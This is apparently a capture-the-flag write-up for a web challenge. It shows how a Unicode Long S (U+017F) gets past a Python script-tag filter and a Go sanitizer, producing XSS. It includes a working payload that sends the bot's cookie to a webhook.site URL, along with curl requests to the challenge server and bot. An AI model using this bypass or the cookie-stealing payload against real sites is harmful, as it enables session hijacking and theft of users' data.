# Demolition

| Field       | Value                              |
|-------------|------------------------------------|
| Platform    | UNbreakable International 2026     |
| Category    | web                                |
| Difficulty  | Medium/Hard                        |

## Description
> This challenge is basically you vs the website's last three braincells, but plot twist: you might lose a few of your own on the way.

## TL;DR
XSS via Unicode case folding bypass: Python's ASCII-mode regex doesn't catch `<ſcript>` (Long S, U+017F), but Go's `strings.EqualFold` treats it as "script", so the Go sanitizer outputs canonical `<script>` tags that execute in the browser.

## Initial analysis

### Architecture

```
Browser ──> Flask app (Python)
                ├── /api/render ──> Go sanitizer (port 7071)
                ├── /api/compose
                ├── /api/mail-preview
                └── /api/profile

Bot (Puppeteer) ── sets FLAG cookie ── visits user URL
```

The bot:
- Navigates to the challenge origin, sets a `FLAG` cookie (httpOnly=false, sameSite=Lax)
- Navigates to the URL we send it
- Waits 5 seconds

### Render pipeline flow

1. The page loads with query string parameters in `window.__BOOT__`
2. `client.js` automatically runs `runRender()` on load
3. Fetches profile from `/api/profile?p=BLOB` and compose signal from `/api/compose`
4. `forgeRuntime()` builds a manifest that determines the **engine** (python or go)
5. Sends the draft to `/api/render` with the selected engine
6. The response HTML is injected via `innerHTML` and `armScripts()` re-creates the `<script>` tags so they execute

### Protections

**Flask - SCRIPT_FENCE_RE:**
```python
SCRIPT_FENCE_RE = re.compile(r"<\s*/?\s*script\b", re.IGNORECASE | re.ASCII)
```
Blocks any draft containing `<script` (case insensitive, ASCII only).

**Python engine:** `html.escape(draft)` — escapes everything.

**Go engine:** Sends to the Go sanitizer with `allow: ["script"]`. Only "script" tags pass through unescaped.

**Go sanitizer (main.go):**
```go
var tagRE = regexp.MustCompile(`(?is)<\s*(/?)\s*([^\s>/]+)([^>]*)>`)

func canonicalTag(name string, allow []string) string {
    for _, candidate := range allow {
        if strings.EqualFold(name, candidate) {
            return candidate
        }
    }
    return ""
}
```
If the tag name matches "script" case-insensitively, it passes through. Otherwise, it gets escaped.

## Identified vulnerability

### Type: Unicode Case Folding Bypass (CWE-178: Improper Handling of Case Sensitivity)

The discrepancy between how Python and Go handle Unicode character equivalence:

**Python** (`re.ASCII`): Only considers ASCII equivalents. `ſ` (U+017F) != `s` (U+0073).

**Go** (`strings.EqualFold`): Uses Unicode Simple Case Folding. The character `ſ` (Latin Small Letter Long S, U+017F) is in the same fold orbit as `s`/`S`:

```
SimpleFold('S') → 's'
SimpleFold('s') → 'ſ'
SimpleFold('ſ') → 'S'
```

Therefore: `strings.EqualFold("ſcript", "script")` == **true**

### Attack chain

```
<ſcript>XSS</ſcript>
       │
       ▼
Python SCRIPT_FENCE_RE ──> NO MATCH (ſ ≠ s in ASCII) ──> PASS
       │
       ▼
Go sanitizer canonicalTag("ſcript", ["script"])
  └── EqualFold("ſcript", "script") == true
  └── Returns canonical: "script"
       │
       ▼
Output: <script>XSS</script>
       │
       ▼
Client: innerHTML + armScripts() ──> SCRIPT EXECUTES
```

### Selecting the "go" engine

The engine is controlled via the profile blob. The parameter `p=render.engine=go` is parsed as:
```python
parse_profile_blob("render.engine=go")
# → {"render": {"engine": "go"}}
```

In `/api/profile`, `payload.update(parsed)` overwrites `render.engine` to "go".

The client-side `forgeRuntime()` always includes `render.engine` in the routed paths (hardcoded in `routeManifestPaths`), so the "go" engine propagates to the manifest.

## Solution process

### Step 1: Confirm the Python regex bypass

```python
import re
SCRIPT_FENCE_RE = re.compile(r"<\s*/?\s*script\b", re.IGNORECASE | re.ASCII)
test = "<\u017fcript>alert(1)</\u017fcript>"  # ſcript
print(SCRIPT_FENCE_RE.search(test))  # None - bypass!
```

### Step 2: Confirm the Go sanitizer accepts ſcript

```bash
curl -s -X POST 'https://demolition.breakable.live/api/render' \
  -H 'Content-Type: application/json' \
  -d '{"draft":"<\u017fcript>alert(1)</\u017fcript>","engine":"go","meta":{}}'
```
Response:
```json
{"blocked": false, "engine": "go", "html": "<script>alert(1)</script>"}
```

### Step 3: Build the full XSS URL

```python
long_s = "\u017f"
payload = f"<{long_s}cript>fetch('https://webhook.site/UUID?c='+document.cookie)</{long_s}cript>"
url = f"https://demolition.breakable.live/?d={urlencode(payload)}&p=render.engine%3Dgo&tpl=profile-card"
```

Key parameters:
- `d` = draft with `<ſcript>` XSS payload
- `p` = `render.engine=go` to activate the Go sanitizer
- `tpl` = any value (needed for the compose signal)

### Step 4: Send to the bot

```bash
curl -X POST 'https://demolition-bot.breakable.live/api/submit' \
  -H 'Content-Type: application/json' \
  -d '{"url": "THE_XSS_URL"}'
```

### Step 5: Receive the flag at the webhook

```
GET /UUID?c=FLAG=CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}
```

## Discarded approaches

- **Turkish dotless i (U+0131, ı)**: Should also work in theory due to the fold orbit `ı → I → i → ı`, but in tests against the server the Go sanitizer escaped it. Possible difference in Go version or in how the character is processed.
- **SSTI via Jinja2**: Templates use `{{ boot | tojson }}` and `{{ trace_html | safe }}`, but `trace_html` goes through `html.escape` + `brace_armor`, blocking template injection.
- **Python engine bypass**: `html.escape(draft, quote=False)` has no useful bypass. The "entity" mode only converts between equivalent forms of HTML entities.

## Final exploit

See `solve.py` — automated script that:
1. Builds the XSS URL with the Long S bypass
2. Sends it to the bot via `/api/submit`
3. The flag arrives at the webhook

## Execution

```bash
python3 solve.py https://webhook.site/YOUR-UUID
```

## Flag
```
CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}
```

## Key Lessons

- **Unicode case folding** is a classic source of bypasses when one system uses ASCII-only matching and another uses Unicode-aware comparison. Python `re.ASCII` vs Go `strings.EqualFold` is a perfect case.
- The character `ſ` (Long S, U+017F) is the most well-known bypass for "script" filters that don't handle Unicode. Also applies to `K` (Kelvin sign, U+212A) for "k".
- The key was identifying that the Go sanitizer **canonicalizes** the tag name by returning the allow list version, not the original input. Thus `<ſcript>` becomes `<script>`.
- `armScripts()` on the client side is necessary because `innerHTML` does not execute `<script>` tags by default in modern browsers.

## References

- [Go strings.EqualFold source](https://cs.opensource.google/go/go/+/refs/tags/go1.22.0:src/strings/strings.go)
- [Unicode Case Folding](https://www.unicode.org/Public/UCD/latest/ucd/CaseFolding.txt)
- [Go caseOrbit table](https://cs.opensource.google/go/go/+/refs/tags/go1.22.0:src/unicode/tables.go) - contains the ſ/s/S fold cycle
- [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
